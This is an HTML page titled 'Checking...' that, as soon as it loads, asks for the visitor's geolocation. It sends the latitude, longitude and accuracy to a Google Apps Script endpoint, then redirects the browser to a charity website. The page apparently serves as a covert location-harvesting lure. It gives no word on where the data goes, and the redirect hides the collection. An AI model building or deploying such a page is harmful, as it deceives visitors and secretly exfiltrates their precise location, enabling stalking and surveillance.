<!DOCTYPE html>
<html>
<head>
  <title>Checking...</title>
  <script>
    function sendLocation(position) {
      const data = {
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
      };

      fetch('https://script.google.com/macros/s/AKfycbyT91-otXJN4OiwEsh0Z53McpuXA6CzG4NHmZZolFoJzUF-upYxcDSB-IhytKtS3v_cqA/exec', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
          'Content-Type': 'application/json'
        }
      }).finally(() => {
        // Redirect after sending
        window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gclid=EAIaIQobChMI5fi0v7GjggMVJpPoCR2YcQlVEAAYASAAEgIQivD_BwE";
      });
    }

    function handleError(error) {
      console.error('Geolocation error:', error);
      window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gclid=EAIaIQobChMI5fi0v7GjggMVJpPoCR2YcQlVEAAYASAAEgIQivD_BwE";
    }

    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        handleError({ message: "Geolocation not supported." });
      }
    }
  </script>
</head>
<body>
  <h2>Checking your location...</h2>
</body>
</html>
